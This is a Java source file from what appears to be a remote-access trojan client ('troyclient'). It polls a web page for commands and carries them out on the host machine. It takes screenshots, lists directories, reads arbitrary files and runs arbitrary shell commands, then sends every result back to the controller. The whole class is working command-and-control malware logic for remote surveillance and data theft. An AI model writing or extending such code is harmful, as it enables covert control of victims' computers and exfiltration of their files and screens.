package ch.lebois.troyclient.functions;

import ch.lebois.troyclient.chat.Chat;
import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.GetContext;
import ch.lebois.troyclient.service.ListFiles;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import ch.menthe.io.FileHandler;

public class CommandReciver {


    private final Sender sender;
    private final WebHandler webHandler;

    public CommandReciver(WebHandler webHandler) {
        this.webHandler = webHandler;
        sender = GetContext.SENDER;
    }

    public String[] getWebsiteCommands() {
        return webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0]
                .replace("\\r", "").split("\\n");
    }

    public void readCommands() {
        try {
            for (String command : getWebsiteCommands()) {
                switch (command.toLowerCase()) {
                    case "screenshot":
                        sender.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
                        break;
                    case "cmd":
                    case "bash":
                    case "yes":
                        sender.send("error", "Command '" + command + "' not allowed");
                        break;
                    case "clear":
                        for (int i = 27; i != 0; i--) {
                            sender.send("commandout", "");
                        }
                        break;
                    default:
                        otherCommands(command);
                        break;
                }
            }
        } catch (NullPointerException | IndexOutOfBoundsException e) {
            e.printStackTrace();
        }
    }

    private void otherCommands(String command) {
        if (command.startsWith("msg")) {
            Chat chat = Chat.getInstance();
            chat.addMessage("Hermann: " + command.substring(6));
            Console.execute(command);
            sender.send("message", "CHAT - Hermann: " + command.substring(6));
        } else if (command.startsWith("ls")) {
            sender.send("commandout", System.getProperty("user.dir") + " $ " + command);
            listFiles(command);
        } else if (command.startsWith("read")) {
            sender.send("commandout", System.getProperty("user.dir") + " $ " + command);
            readFile(command);
        } else {
            executeNormalCommand(command);
        }
    }

    private void readFile(String command) {
        FileHandler fileHandler = new FileHandler(command.substring(5));
        for (String row : fileHandler.readRows()) {
            sender.send("commandout", row);
        }
    }

    private void listFiles(String command) {
        try {
            for (String s : ListFiles.ls(command.substring(3))) {
                System.out.println(s);
                sender.send("commandout", s);
            }
        } catch (StringIndexOutOfBoundsException e) {
            for (String s : ListFiles.ls("")) {
                System.out.println(s);
                sender.send("commandout", s);
            }
        } catch (NullPointerException e1) {
            sender.send("errorout", "Wrong Syntax with '" + command + "'");
        }
    }

    private void executeNormalCommand(String command) {
        try {
            if (!command.equals("")) {
                for (String out : Console.execute(command)) {
                    sender.send("commandout", out);
                }
            }
        } catch (NullPointerException e) {
            e.printStackTrace();
            sender.send("errorout", "No command '" + command + "' found");
        }
    }


}
